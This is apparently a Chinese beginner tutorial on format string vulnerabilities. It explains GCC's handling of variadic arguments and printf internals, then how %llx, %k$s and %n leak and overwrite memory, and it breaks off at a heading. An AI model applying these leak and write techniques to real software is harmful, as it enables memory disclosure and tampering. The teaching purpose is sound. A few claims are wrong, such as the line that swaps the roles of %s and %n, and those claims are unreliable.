#  PWN入门：误入格式化字符串漏洞   
福建炒饭乡会  看雪学苑   2025-01-18 09:59  
  
```
```  
##   
  
可变  
参数  
  
  
在常规情况下，C语言中函数接收的形参数量都是固定的，但事实上，C语言中函数接受形参的数量并不是必须固定的，也支持动态变化的形参数量。  
  
  
函数间传递可变参数时，基本的要求是函数至少指定一个参数。  
  
  
C语言中可变形参的定义方式如下所示，除了首个参数指定类型和变量名外，后续的参数都通过...省略号代替。  
  
  
```
(type arg1, ...)

```  
  
  
  
除了...省略号代表动态变化的参数外，C语言还允许宏内通过__VA_ARGS__代替...。  
  
  
```
__VA_ARGS__

示例：
#define test(...) orig(__VA_ARGS__)

```  
  
###   
### 可变参数的处理  
  
首先先来看一下可变参数是如何传递的。下方给出了函数原型和函数调用。  
  
  
```
void test(int num, ...)
test(10, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0);

```  
  
  
  
从反汇编上看，调用者保存寄存器处理了前6个参数，栈空间处理了后5个参数。此时可以知道，可变参数的传递也是遵循函数调用规范的。  
  
  
```
push   $0x0
push   $0x9
push   $0x8
push   $0x7
push   $0x6
mov    $0x5,%r9d
mov    $0x4,%r8d
mov    $0x3,%ecx
mov    $0x2,%edx
mov    $0x1,%esi
mov    $0xa,%edi
call   test

```  
  
  
  
对于可变参数的处理，GLibC提供了下方的4个接口函数。  
  
  
```
void va_start(va_list ap, last);
type va_arg(va_list ap, type);
void va_end(va_list ap);

```  
  
####   
#### va_list  
  
这几个接口函数都会接收一个类型为va_list的变量，va_list的全称是可变参数列表variable argument list。  
  
  
```
typedef __builtin_va_list __gnuc_va_list;
typedef __gnuc_va_list va_list;

```  
  
  
  
追踪va_list的定义时一开始会查找usr目录下的stdarg.h，但是这个头文件到__builtin_va_list就结束了，头文件中没有又在编译过程中产生，难道是GCC内部定义的？  
  
  
在GCC的文档中，有一个特殊的专栏gccint，这个专栏主要是介绍GCC编译器的内部结构，其中18.10 Implementing the Varargs Macros专门介绍了vaargs相关宏的实现。  
  
  
```
https://gcc.gnu.org/onlinedocs/gccint/Varargs.html

```  
  
  
  
通过浏览GCC源代码可以发现，__builtin_va_list并不是直接定义的，而是GCC内部生成的，并且__builtin_va_list的定义是区分体系结构的，下面展示了X86架构的情况。  
  
  
```
ix86_build_builtin_va_list_64
    -> build_decl (BUILTINS_LOCATION, TYPE_DECL, get_identifier ("__va_list_tag"), record);
    -> build_decl (BUILTINS_LOCATION, FIELD_DECL, get_identifier ("gp_offset"), unsigned_type_node);
    -> build_decl (BUILTINS_LOCATION, FIELD_DECL, get_identifier ("fp_offset"), unsigned_type_node);
    -> build_decl (BUILTINS_LOCATION, FIELD_DECL, get_identifier ("overflow_arg_area"), ptr_type_node);
    -> build_decl (BUILTINS_LOCATION, FIELD_DECL, get_identifier ("reg_save_area"), ptr_type_node);

```  
  
  
  
可以在GDB中打印va_list变量确认这一点。  
  
  
```
p /x valist
$1 = {{gp_offset = 0x8, fp_offset = 0x30, overflow_arg_area = 0x7fffffffde90, reg_save_area = 0x7fffffffddd0}}

```  
  
  
  
通过查看目前另外一种非常流行的体系结构ARM，可以看到__builtin_va_list的成员结构与X86几乎完全不同。  
  
  
```
aarch64_build_builtin_va_list
    -> build_decl (BUILTINS_LOCATION, TYPE_DECL, get_identifier ("__va_list"), va_list_type);
    -> build_decl (BUILTINS_LOCATION, FIELD_DECL, get_identifier ("__stack"), ptr_type_node);
    -> build_decl (BUILTINS_LOCATION, FIELD_DECL, get_identifier ("__gr_top"), ptr_type_node);
    -> build_decl (BUILTINS_LOCATION, FIELD_DECL, get_identifier ("__vr_top"), ptr_type_node);
    -> build_decl (BUILTINS_LOCATION, FIELD_DECL, get_identifier ("__gr_offs"), integer_type_node);
    -> build_decl (BUILTINS_LOCATION, FIELD_DECL, get_identifier ("__vr_offs"), integer_type_node);

p /x valist
$3 = {__stack = 0x7ffffff1c0, __gr_top = 0x7ffffff1c0, __vr_top = 0x7ffffff180, __gr_offs = 0xffffffc8, __vr_offs = 0xffffff80}

```  
  
  
  
GCC支持的目标体系结构有很多，为了统一管理不同体系结构的实现，GCC定义了TARGET_宏接口，不同体系结构的实现需要绑定到对应的接口上。  
  
  
比方说针对va_list的实现都绑定到TARGET_BUILD_BUILTIN_VA_LIST宏上。  
  
  
```
#define TARGET_BUILD_BUILTIN_VA_LIST aarch64_build_builtin_va_list
#define TARGET_BUILD_BUILTIN_VA_LIST ix86_build_builtin_va_list

ix86_build_builtin_va_list
    -> ix86_build_builtin_va_list_64

```  
  
  
  
每种体系结构的实现文件中都必须指定targetm成员，且该成员必须绑定到TARGET_INITIALIZER宏上。  
  
  
```
struct gcc_target targetm = TARGET_INITIALIZER;

```  
  
  
  
该宏的作用是初始化目标端架构信息，在target.def文件中实现gcc_target。  
  
但它定义gcc_target结构体比较特殊。  
  
  
```
HOOK_VECTOR (TARGET_INITIALIZER, gcc_target)
......
HOOK_VECTOR_END (C90_EMPTY_HACK)

```  
  
  
  
先来看一下HOOK_VECTOR宏，它其实就是定义struct xxx {。  
  
  
```
#define HOOKSTRUCT(FRAGMENT) FRAGMENT
#define HOOK_VECTOR_1(NAME, FRAGMENT) HOOKSTRUCT (FRAGMENT)
HOOK_VECTOR(INIT_NAME, SNAME) HOOK_VECTOR_1 (INIT_NAME, struct SNAME {)

```  
  
  
  
当我们看到单{的时候一定会感觉很奇怪，怎么缺了一半！为了实现结构体的定义，缺的部分就一定有东西补上，在这里补缺口的就是HOOK_VECTOR_END。  
  
  
HOOK_VECTOR_END匹配HOOK_VECTOR一块定义了struct {,} xxx;。  
  
  
```
#define HOOK_VECTOR_END(DECL_NAME) HOOK_VECTOR_1(,} DECL_NAME ;)

```  
  
  
  
结构体中的成员定义会一般会通过DEFHOOK定义，该宏会定义根据返回值数据类型TYPE、函数名NAME、形参列表PARAMS定义出函数指针变量。  
  
  
```
#define DEFHOOK(NAME, DOC, TYPE, PARAMS, INIT) TYPE (* NAME) PARAMS;

```  
  
  
  
以下方的DEFHOOK为例，它定义了tree build_builtin_va_list(void)。  
  
  
```
DEFHOOK (
    build_builtin_va_list,
    "...",
    tree, (void),
    std_build_builtin_va_list
)

```  
  
  
  
除了DEFHOOK宏之外，也可以通过DEFHOOKPOD宏定义一个普通变量。  
  
  
```
#define DEFHOOKPOD(NAME, DOC, TYPE, INIT) TYPE NAME;

```  
  
  
  
从上面可以看到HOOK_VECTOR和HOOK_VECTOR_END打着TARGET_INITIALIZER的旗号于定义了gcc_target结构体。  
  
  
至于TARGET_INITIALIZER宏的真身，则会在编译过程中展现。编译时会生成target-hooks-def.h，其中包含着TARGET_INITIALIZER宏的定义。  
  
  
```
#define TARGET_INITIALIZER \
    { \
        ...... \
        TARGET_BUILD_BUILTIN_VA_LIST, \
        ...... \
    }

```  
  
  
  
GCC会通过targetm接口针对不同的架构定制生成的信息。比如下面通过targetm.build_builtin_va_list接口生成va_list。  
  
  
```
c_common_nodes_and_builtins
    -> build_common_tree_nodes
        -> tree t = targetm.build_builtin_va_list ()
        -> va_list_type_node = t
    -> lang_hooks.decls.pushdecl(build_decl (UNKNOWN_LOCATION, TYPE_DECL, get_identifier ("__builtin_va_list"), va_list_type_node))

```  
  
  
  
在ix86_build_builtin_va_list函数中我们会看到这样一种现象，就是获取va_list时会拿两次，分别对应sysv和ms，返回时会先判断，再选择其中的一种作为返回值。  
  
  
这是因为GCC支持两种应用程序二进制接口ABI Application Binary Interface类型，一是System V，对应Unix/Linux平台，二是MicroSoft，对应微软的Windows平台，GCC会根据当前使用的平台进行选项。  
  
  
Unix/Linux平台使用的ABI被称作是ELF Executable and Linkable Format，而Windows平台使用的ABI则被称作是PE Portable Executable，两种格式的ABI其实是非常接近的，因为它们都源自于COFF Common File Format。  
  
  
```
ix86_build_builtin_va_list
    -> sysv_va_list_type_node
    -> ms_va_list_type_node
    -> return ((ix86_abi == MS_ABI) ? ms_va_list_type_node : sysv_va_list_type_node);

```  
  
  
  
在X86架构中，va_list中存在gp_offset、fp_offset、overflow_arg_area、reg_save_area四个成员，其中overflow_arg_area指向非寄存器存储的数据地址（一般放在栈上），reg_save_area指向寄存器存储的数据地址（一般会从寄存器挪到栈上），gp_offset是指通用寄存器保存的数据在reg_save_area中的偏移值，fp_offset是指浮点寄存器保持的数据在reg_save_area中的偏移值。  
  
  
```
----------------------------------------------
caller   | ...                               |
stack    | arg7, arg8, ..., argX             | <----|
----------------------------------------------      |
         | callee return                     |      |
         | caller rbp                        |      |
----------------------------------------------      |
         | ......                            |      |
         | xmm0 - xmm7                       | <--| |
callee   | rdi, rsi, rdx, rcx, r8, r9        | <--| |
stack    | ......                            |    | |
         | fp_offset         | gp_offset     |    | |
         | overflow_arg_area | reg_save_area |    | |
------------------^------------------^--------    | |
                  |                  |            | |
                  |                  |------------| |
                  |---------------------------------|

```  
  
  
  
这里还需针对浮点数据特殊说明一下，下面展示了一个带有浮点类型数据的调用。  
  
  
```
void test(int num, ...)
test(20,
    1.1, 2.1, 3.1, 4, 5, 6, 7, 8.2, 9.11, 0.11,
    1.1, 2.1, 3.1, 4, 5, 6, 7, 8.2, 9.11, 0.11);

```  
  
  
  
从上方可以看到，test函数接受了许多的浮点数据。  
  
  
在当前CPU中浮点寄存器一共有8个，如果可变参数列表中的浮点数据未超出8个，那么就会将当前传递的浮点数据数量放入rax寄存器中，如果超出了就将上限8压入rax寄存器中。  
  
  
```
存入10个浮点数据：
mov    $0x8,%eax
call   test

存入3个浮点数据：
mov    $0x3,%eax
call   test

```  
  
  
  
对于超出浮点寄存器存储上限的部分，当然也是放到栈上。  
  
  
针对浮点数的处理可以分成四个阶段，第一个阶段是给1到7号浮点寄存器赋值，并将0号浮点寄存器的数值先放到rax内（因为0号浮点寄存器后面会用）。  
  
  
第二个阶段是处理超出存储容量的浮点数，它有着非常统一的格式movsd val,%xmm0 ; lea -0x8(%rsp),%rsp ; movsd  %xmm0,(%rsp)，第一步做的保存浮点数到寄存器xmm0，第二步是将rsp减去0x8再更新rsp，这相当于对栈进行扩容，第三步是将xmm0中保持的浮点数存放到刚扩大的栈上。  
  
  
阶段三是还原xmm0寄存器中本应存放的数值。  
  
  
阶段四是处理浮点寄存器保持的浮点数数量，然后调用函数。  
  
  
```
阶段一：
movsd  0xdc1(%rip),%xmm7
movsd  0xdc1(%rip),%xmm6
movsd  0xdc1(%rip),%xmm5
movsd  0xdc1(%rip),%xmm4
movsd  0xdc1(%rip),%xmm3
movsd  0xdc1(%rip),%xmm2
movsd  0xd91(%rip),%xmm1
mov    0xd92(%rip),%rax

阶段二：
sub    $0x8,%rsp
movsd  0xd8e(%rip),%xmm0
lea    -0x8(%rsp),%rsp
movsd  %xmm0,(%rsp)
movsd  0xd84(%rip),%xmm0
lea    -0x8(%rsp),%rsp
movsd  %xmm0,(%rsp)
movsd  0xd7a(%rip),%xmm0
lea    -0x8(%rsp),%rsp
movsd  %xmm0,(%rsp)
movsd  0xd6a(%rip),%xmm0
lea    -0x8(%rsp),%rsp
movsd  %xmm0,(%rsp)

阶段三：
movq   %rax,%xmm0

阶段四：
mov    $0x8,%eax
call   test

```  
  
  
  
进入接收可变参数的函数后，如果判断rax寄存器中的数值非零，就会将8个浮点寄存器上的数值存储到栈上。  
  
  
```
test   %al,%al
je     1191 <va_args4int+0x58>
movaps %xmm0,-0x80(%rbp)
movaps %xmm1,-0x70(%rbp)
movaps %xmm2,-0x60(%rbp)
movaps %xmm3,-0x50(%rbp)
movaps %xmm4,-0x40(%rbp)
movaps %xmm5,-0x30(%rbp)
movaps %xmm6,-0x20(%rbp)
movaps %xmm7,-0x10(%rbp)

```  
  
####   
#### va_start  
  
va_start的作用是初始化可变参数列表，它的原型是__builtin_va_start，也是GCC内部实现的，实现方式大同小异，这里就不再进行解析了。  
  
  
```
gcc_target中的定义实现 - target.def：
DEFHOOK_UNDOC(
    expand_builtin_va_start,
    "Expand the @code{__builtin_va_start} builtin.",
    void, (tree valist, rtx nextarg), NULL
)

指定架构中的va_start实现：
#define TARGET_EXPAND_BUILTIN_VA_START ix86_va_start

针对架构生产的gcc_target信息（通过宏绑定成员）：
target-hooks-def.h
#define TARGET_INITIALIZER {
    ......
    TARGET_EXPAND_BUILTIN_VA_START,
    ......
}

GCC对需要展开函数的生成过程：
expand_builtin
    -> case BUILT_IN_VA_START
        -> expand_builtin_va_start
            -> targetm.expand_builtin_va_start

```  
  
  
  
va_start的实现在程序编译时会被GCC编译器直接放进去，下方展示的是va_start对应的汇编代码。  
  
  
```
movl   $0x8,-0xc8(%rbp)
movl   $0x30,-0xc4(%rbp)
lea    0x10(%rbp),%rax
mov    %rax,-0xc0(%rbp)
lea    -0xb0(%rbp),%rax
mov    %rax,-0xb8(%rbp)

```  
  
  
  
上方的汇编代码的开场白是两条movl指令，它将0x8和0x30两个值压到栈上，这两个数值是特殊的，在X86中一般都是固定的，其中0x8代表gp_offset，0x30代表fp_offset。  
  
  
然后会将地址rbp + 0x10放入rax内，一般来讲函数内部都是通过rbp - xx的方式操作栈上数据的，但这里使用的确实加法，本次加法跳过了返回地址和父函数的rbp，要知道函数调用发生前rbp上被存入了寄存器无法存放的形参，显然这里就是获取这些参数。  
  
  
lea之后会通过mov将父函数存放形参的地址放到rbp - 0xc0的位置。  
  
  
最后程序会复刻上一次lea和mov，将地址rbp - 0xb0存放到rbp - 0xb8的位置上，这个操作是做什么呢？  
  
  
从上面的操作可以观察到一个事实，就是上面多个参数放入栈的位置其实是紧挨的。  
  
  
```
c8 c4 c0 b8

```  
  
  
  
假如对rbp - 0xc8地址进行观察，该地址其实就是va_list变量的地址，所以va_start，其实就是对va_list变量进行赋值。  
  
  
```
p /x $rbp-0xc8
$3 = 0x7fffffffde18

p &valist
$1 = (va_list *) 0x7fffffffde18

(gdb) x /4gx 0x7fffffffde18
0x7fffffffde18: 0x0000003000000008      0x00007fffffffdef0
0x7fffffffde28: 0x00007fffffffde30

```  
  
  
  
此时我们就知道了va_start是如何初始化va_list的。  
#### va_arg  
  
va_arg接口的作用是获取形参。  
  
  
```
| c8        | c4        | c0                | b8            |
| gp_offset | fp_offset | overflow_arg_area | reg_save_area |

```  
  
  
  
GCC针对va_arg生成的汇编代码分成四个部分。  
  
  
第一部分是判断需不需要从寄存器保存区域取出数据，首先会根据取出数据的类型看是从gp_offset还是fp_offset拿偏移值，拿到偏移值后会将它根据0x2f或0xaf进行比较，如果ja发现CF和ZF均为0（大于gp_offset或fp_offset）就会跳转。  
  
  
根据0x2f和0xaf这两个数值比较，是因为它们代表着上限，当最新的gp_offset或fp_offset超出上限时，就说明寄存器保存的数据已经全部被检索完了。  
  
  
```
a. mov    -0xc4(%rbp),%eax
b. mov    -0xc8(%rbp),%eax
a. cmp    $0xaf,%eax
b. cmp    $0x2f,%eax
ja     11ee

```  
  
  
  
一般来讲是不会直接跳转的，跳转是处理溢出寄存器存储容量的参数。  
  
  
处理寄存器保持的参数时，会先取出reg_save_area和gp_offset（也可以是fp_offset）两个信息，然后累加reg_save_area和偏移值得到数据。  
  
  
完成数据的获取后，会将移动偏移值指向新的数据。  
  
  
```
mov    -0xb8(%rbp),%rax
mov    -0xc8(%rbp),%edx
mov    %edx,%edx
add    %rdx,%rax

mov    -0xc8(%rbp),%edx
add    $0x8,%edx
mov    %edx,-0xc8(%rbp)

```  
  
  
  
如果跳转到11ee处对溢出数据进行处理时，它会先取出overflow_arg_area的地址然后进行累加，并将累加后的新地址保存到0xc0处，最后再获取数据。  
  
  
累加后保存的方式保证了地址指向的数据永远是最新的。  
  
  
```
11ee：
mov    -0xc0(%rbp),%rax
lea    0x8(%rax),%rdx
mov    %rdx,-0xc0(%rbp)
mov    (%rax),%eax

```  
  
####   
#### va_end  
  
GLibC对于va_end的解释是清理va_list，释放资源避免未定义行为出现。但实际上GCC也可能并不对它进行实现，因为可能没什么需要释放的。  
  
  
因此va_end在大多数时候是做出任何操作的，不起任何作用。  
  
## 字符串  
  
字符串是由一个或多个字符组成的序列，C语言中双引号""内字符就是字符串，它以空字符\0作为结束符标志。  
  
  
字符串中包含的字符分成三类，一是普通字符，二是转义字符，三是格式化占位符。  
  
### 转义字符  
  
字符串经常需要和转义字符打交道，所谓的转义字符就是指通过普通字符表达出特殊含义的，C语言中有三种情况需要进行转义，一是转义普通字符表示特殊操作（比如\n），二是普通字符被C语言占用，通过转义表示正常字符（比如\"），三是表示非10进制格式数据（比如\xhh）。  
  
  
```
\n：表示回车
\"：表示双引号
\ddd：表示8进制数据ddd
\xhh：表示16紧张数据hh

```  
  
  
  
总结来讲，就是通过识别\标志，确认转义字符的起始位置，然后将后续的字符按照特定的规则转换成特定的含义。  
  
### 格式化占位符  
  
格式化占位符的作用是增强字符串的灵活性，格式占位符一般需要匹配参数进行使用，通过格式化占位符的帮助，我们可以非常灵活的将各种参数与字符串组合在一起。  
  
  
含有格式化占位符的字符串被称作是格式化字符串。  
  
  
在介绍格式化占位如何完成灵活性的任务之前，我们先来看一下它的语法。  
  
  
```
%[parameter][flags][field width][.precision][length]type

```  
  
  
  
%是格式化占位符的起始标志。  
  
  
parameter指的是k$，它的作用是指定第n个参数进行打印，$是标识符，检索到$就会通过$前的数据作为索引值，parameter是可以不填写的。  
  
  
flags指的是参数合进字符串时的格式信息，flags是可以不填写的。  
  
  
```
+：显示数值的正负符号
    %+d, 2 -> +2 ; %+d, -2 -> -2

空格：使用空格填充数值的正负符号，+的优先级更高
    % d, 2 -> 空格2

-：设置为左对齐，默认右对齐
    %-4d, 2 -> 2空格空格空格
    %4d, 2  -> 空格空格空格2

#：对于g和G来讲，保留0表示精度；对于f、F、e、E、g、G来讲，会保留小数点；对于o、x、X来讲，会自动填充O、0x、0X表示进制格式

0：使用0填充宽度
    -> %04d -> 0002

```  
  
  
  
field width指的是最小输出宽度，precision则负责最大输出宽度（不会截断整数类型，限制浮点类型小数右侧显示位数），它们都可以不填写。  
  
  
```
%01.2s, "22222" -> 22

```  
  
  
  
length的作用是指定数据类型的大小，常见的有hh、l等等，也是可以不填写的。  
  
  
```
%hhu, 22222 -> 206
    -> 十进制：22222 -> 二进制：0101 0110 1100 1110
    -> hh -> 1字节 -> 二进制：1100 1110 -> 十进制：206

```  
  
  
  
最后一个type是最重要的，因为它必须填写。它的的作用是指定接收参数的数据类型，常见的数据类型有d、f等等。  
  
  
在众多的数据类型中有一个特殊的存在，就是n，对于%n来讲，它的作用是将已经成功输出的字符写入整形指针变量内。  
  
#### 格式化字符串的组合  
  
C语言最常见格式化字符串整合函数就是printf，它接受的第一个参数是格式化字符串，其余参数为格式化字符串所需要的参数。  
  
  
```
int printf(const char* format, ...)

```  
  
  
  
printf函数将格式化字符串与参数完成组合后，会将结果输出到标准输出stdout中。  
  
  
从下方的示例中可以看到，printf函数接受了两个参数。  
  
  
```
printf("%s - buwula", "wula!");
    -> wula! - buwula

```  
  
  
  
除了借助printf这样的打印函数外，我们也可以选择借助vsnprintf函数，将组合好的格式化字符串放入缓冲区变量内，但不输出到某某文件中。  
  
  
```
test(const char* fmt, ...)
    -> va_list args;
    -> va_start(args, fmt);
    -> vsnprintf(buf, BUFSIZE, fmt, args);
    -> va_end(args);

```  
  
####   
#### 标准输入与输出  
  
stdin、stdout、stderr属于标准输入输出，其中stdin的作用是响应键盘的输入，stdout、stderr将内容输出到屏幕，即它们对于Linux而言是外部设备，在秉承一切皆文件原则的Linux中，它们作为设备文件存在于dev目录下。  
  
  
stdout和stderr的区别在于缓冲区，stdout只有当缓冲区满了及遇到换行符的情况下才会输出信息，而stderr则是直接输出。  
  
  
```
ls /dev/ | grep std
stderr
stdin
stdout

```  
  
  
  
对于已经打开的文件，Linux会给它们分配文件描述符，进程可以通过文件描述符对文件进行操作。stdin、stdout、stderr对于的文件描述符分别是0、1、2。  
  
  
```
ls /proc/self/fd/
0  1  19  2  20  23  27  3

```  
  
  
  
比如某个程序当中含有大量的printf函数，而你有时候不需要打印，更不需要将打印输出到屏幕上，那么就可以在函数的开头通过stdout的文件描述符1，将stdout关闭（close(1)），那么就不会再看到输出了。  
  
#### printf函数的实现  
  
GLibC中对printf函数的实现如下，我们可以看到它与上方的vsnprintf示例非常相似。  
  
  
```
__printf
    -> va_list arg;
    -> va_start (arg, format);
    -> __vfprintf_internal (stdout, format, arg, 0);
    -> va_end (arg);

```  
  
  
  
从上方的函数名__printf函数可以发现，按照道理来讲，动态链接时根据字符串printf进行匹配时应该匹配不到__printf啊！  
  
  
这其实是因为GLibC通过ldbl_strong_alias将printf设置成了__printf的别名。  
  
  
```
ldbl_strong_alias (__printf, printf);

```  
  
  
  
ldbl_strong_alias的别名绑定实际是通过GCC的__attribute__和alias关键字实现的。它会先借助__typeof获取printf函数的返回值类型，然后根据类型声明一个extern void printf的函数，最后通过__attribute__和alias将printf设置成了__printf的别名。  
  
  
```
#define _strong_alias(name, aliasname) \
    extern __typeof (name) aliasname __attribute__ ((alias (#name))) __attribute_copy__ (name);
#define strong_alias(name, aliasname) _strong_alias(name, aliasname)
#define ldbl_strong_alias(name, aliasname) strong_alias (name, aliasname)

```  
  
  
  
__printf中组合格式化字符串的关键在于__vfprintf_internal，  
  
  
```
int vfprintf (FILE *s, const CHAR_T *format, va_list ap, unsigned int mode_flags);

```  
  
  
  
vfprintf内部虽然为了处理格式化字符串做的非常复杂，但还是免不了使用va_arg。  
  
  
```
vfprintf
    -> printf_positional
        -> va_arg

```  
  
  
  
虽然vfprintf内部实现并没有进行解析，但是有一点是明确的，即它仍会根据字符串的结束符\0辨别是否结束，在\0之前的所有的格式化占位符%都会被解析出来，然后根据格式化占位符的要求利用va_arg查找数据。  
  
#### 字符串结束符的问题  
  
在C语言中，一般都会通过空字符\0判断字符串是否结束的，这个问题常常会带来一些烦恼，最常见的烦恼就是地址使用问题。  
  
  
使用地址出现烦恼的原因并不复杂，即地址中存在0x00字节，该字节就是\0，因此当C语言解析地址时，如果碰到0x00就会自动截断，导致地址不全或没有地址。  
  
  
```
32位：0x0804a028
32位：0x08000400
64位：0x00000000004000de
64位：0x0000000000404000

```  
  
  
  
地址中的0x00字节无非出现在3个位置中，一是位于有效地址的起始字符前，二是位于有效地址的末尾，三是位于有效地址的中间。  
  
  
在32位系统当中，地址会占用全部的32个比特位。这个时候情况会更好一些，因为只有2和3两种情况需要考虑，情况1根本就不会出现。  
  
  
在64位系统当中，地址一般只会使用48个比特位，这个时候情况会更差一些，因为三种情况都需要考虑到。  
  
  
下方给出了一段针对三种情况进行打印的示例代码。  
  
  
```
typedef struct _print_str {
    char* desc;
    char* str;
    char* str_bytes;
} print_str;

static void addr_with_null_analyze(void)
{
    int cnt;
    print_str addr_null_prt[] = {
        {
            .desc = "0x00 before the effective address\0",
            .str = "0x0000444444404545\0",
            .str_bytes = "\x45\x45\x40\x44\x44\x44\x00\x00\0",
        },
        {
            .desc = "0x00 at the end of effective address\0",
            .str = "0x4444444444404500\0",
            .str_bytes = "\x00\x45\x40\x44\x44\x44\x44\x44\0",
        },
        {
            .desc = "0x00 in the effective address\0",
            .str = "0x4444444444400045\0",
            .str_bytes = "\x45\x00\x40\x44\x44\x44\x44\x44\0",
        },
    };

    cnt = sizeof(addr_null_prt) / sizeof(print_str);
    while (cnt > 0) {
        printf(
            "desc: %s\n"
            "\torig: %s\n"
            "\tbytes: start-%s-end\n",
            addr_null_prt[cnt - 1].desc,
            addr_null_prt[cnt - 1].str,
            addr_null_prt[cnt - 1].str_bytes
        );

        cnt--;
    }
}

```  
  
  
  
从示例代码的输出结果中可以看到，当\0位于地址中部时，高位地址全部被截断了，当\0位于地址末尾时，整个地址都会被阶段，当\0位于地址开头时，地址是占不满64位的。  
  
  
```
desc: 0x00 in the effective address
    orig: 0x4444444444400045
    bytes: start-E-end
desc: 0x00 at the end of effective address
    orig: 0x4444444444404500
    bytes: start--end
desc: 0x00 before the effective address
    orig: 0x0000444444404545
    bytes: start-EE@DDD-end

```  
  
  
  
这个时候我们不难知道，想要通过C语言的相关字符串处理接口完整的处理地址可不是一件容易的事情，天大地大，内存空间何等广阔，地址难道就找不到一个容身之地吗？  
  
  
先来看一下在地址的获取问题，怎么做可以保障完整性。  
  
  
◆方法一：类似于read可以做到读取\0的函数。  
  
  
◆方法二：通过小端字节序特性与字符数组初始化特性打出组合拳（只能处理情况1，即只有有效地址的起始字符前是\0）。  
  
  
首先假设地址0x0000000044404545通过命令行参数传递给程序，这个时候如果发现命令行参数中含有空字符\0，它会发出一个警告，然后自动的帮助我们将\0清理掉。  
  
  
```
bash: warning: command substitution: ignored null byte in input

```  
  
  
  
由于当前机器使用小端字节序的缘故，所以低位地址数据会存入高位地址中。  
  
  
```
接收到的参数：0x44404545
内存布局：45 45 40 44 00

```  
  
  
  
当我们通过strncpy()或snprintf等类似功能的函数，将接受到的参数向缓冲区变量复制时，仍会保持原数据的内存布局，完成复制后低位地址会保持全部是0的状态，显然我们可以观察到地址的完整性得到了保留。  
  
  
```
复制后的内存布局：45 45 40 44 00 00 00 ...
使用时的地址：0x0000000044404545

```  
  
  
  
对于snprintf这样实现拼接功能的字符串处理函数来讲，这种做法不只要求只有有效地址前含有\x00外，还需要地址是最后一个参数，因为只有这样才可以保证数组初始化特性生效。  
  
## 漏洞的产生  
  
从上方针对格式化字符串的相关描述中，我们可以看到va_xx起到了关键的作用，从va_arg的实现中，我们发现了一个重要的事实，就是它的检索数据分成两个区域，一是寄存器保存的数据，当经过cmp和ja的判断后，如果发现超出上限，就不会再对寄存器保持的数据进行检索。  
  
  
接下来会将目标瞄准父函数栈上存储的溢出数据部分，针对这一部分，GCC生成的代码有一些小缺陷，就是它没有一个结束标记，什么时候结束检索是由程序控制的。  
  
  
在一般情况下，函数的接收的首个格式化字符串参数都是在编译前就已经确认好的，与格式化匹配的参数也都是确认好的，这个时候一般不会出什么纰漏。  
  
  
但是假如格式化字符串是可以由输入方定义的，那么格式化字符串就会产生，下方会针对数据读写两个方面阐述格式化字符串漏洞。  
  
### 信息的泄露  
  
当格式化字符串可以被自定定义时，假如我们构造右侧的字符串"%llx|.....|%llx"，其中包含10个%llx，但除了格式化字符串参数外，不再提供任何参数，那么前5个%llx它会打印调用者寄存器中存储的数据（格式化字符串参数不在va_arg需要获取的参数范围内），至于其余5个则会根据执行va_arg的函数获取，获取参数的起始地址是rbp + 0x10（一般对应调用函数的rsp）。  
  
  
至于va_arg，它可不会管你提供了几个参数，只会按照既定的路线获取参数。  
  
  
```
printf函数运行前的调用者寄存器信息：
(gdb) info registers rsi rdx rcx r8 r9
rsi            0x7fffffffe018      140737488347160
rdx            0x7fffffffe028      140737488347176
rcx            0x555555557dc0      93824992247232
r8             0x0                 0
r9             0x7ffff7fcf680      140737353938560

1号到5号泄露信息：
0x7fffffffe018 | 0x7fffffffe028 | 0x555555557dc0 | 0x0 | 0x7ffff7fcf680

va_arg函数时的栈信息：
(gdb) p /8gx $rbp+0x10
0x7fffffffdef0: 0x0000001000000010      0x0000555555556072
0x7fffffffdf00: 0x0000000000000001      0x00007ffff7df124a
0x7fffffffdf10: 0x0000000000000000      0x0000555555555241
0x7fffffffdf20: 0x0000000100000000      0x00007fffffffe018

6号到10好泄露信息：
0x1000000010 | 0x555555556072 | 0x1 | 0x7ffff7df124a | 0x0

```  
  
  
  
当构造大量的%llx时，还需要考虑变量的缓冲区是否可以容纳它们，如果缓冲区变量的空间有些小，不足够泄露金丝雀和所需内存地址时，岂不是无法对漏洞进行利用？  
  
格式化占位符中有一个特殊的存在，即k$，k代表一个数字，当该指示符添加时，就会打印第n个参数，那么这个时候就不需要构造大量%llx对栈上信息进行泄露了。  
  
  
此时我们已经可以检索函数栈内以及相对更高栈区中的数据。  
  
  
除了栈之外的内存数据，有没有办法读取到呢？  
  
  
首先要明确一点，能读取任意地址上的内容是因为我们可以先栈区填充地址，之后就要从格式化占位符的type上着手，因为type决定了地址如何被解释，是读取栈上的地址数据呢，还是更深一步从栈上地址内的数据呢？  
  
  
```
stack   | address |
address | value   |

```  
  
  
  
◆拥有一个可以控制的栈数据区加上%s的辅助就可以达到这一个目的。  
  
  
先来看一下栈数据区，假设我们向栈上数据区填入了一段完整地址，现在想要打印该地址上的数据，只需要使用%k$s读取就可以。  
  
  
```
[address]%k$s
%k$s[address]

```  
  
  
  
可能有人会好奇，为什么不用%lx或%llx打印呢，原因很简单因为它们根本打印不出来。  
  
  
```
stack    -> 50 10 40 00 00 00 00 00
0x401050 -> 41 41 41 41 41 41 41 41 | AAAAAAAA |

%llx, stack -> *(unsigned long long*)(stack) -> 0x401050
%s, stack   -> *(char*)(0x401050)            -> "AAAAAAAA"

```  
  
###   
### 信息的篡改  
  
上方介绍过格式化占位符中的type，格式化占位符支持的数据类型有很多，其中%n支持前面处理过的字符数量存入一个指针变量内。  
  
  
从下方的示例中可以看到，由于%n之前通过10强制输出了10个字符（空白字符由0填充），所以变量i是数值也是10。  
  
  
```
printf("%.10u%n\n", 1, &i);
printf("i = 0x%x\n", i);

输出结果：
0000000001 
i = 0xa

```  
  
  
  
这个时候我们就可以通过%k$n向任意栈上地址写入数据了。  
  
  
%n作为格式化占位符中type属性的一种类型，也是支持length属性的，下面展示了一些length元素与%n进行组合后的效果。  
  
  
```
hhn：向宽度为1字节的区域写入数据
hn：向宽度为2字节的区域写入数据
n：向宽度为4字节的区域写入数据
ln：向宽度为8字节的区域写入数据
lln：向宽度为16字节的区域写入数据

```  
  
  
  
通过length元素控制被写入区域的宽度，可以实现更加精确的写入控制。  
  
  
这个时候，我们需要抛出与信息泄露时一样的问题，除了栈之外的内存数据，有没有办法进行写入呢？  
  
  
当然也是可以的，保持与信息泄露时制定的方案一直就可以，这是因为%s和%n在打印时对于地址的处理都是一样的，只不过区别在于%s能写，而%n能读罢了。  
  
### 非栈上的格式化字符串漏洞  
  
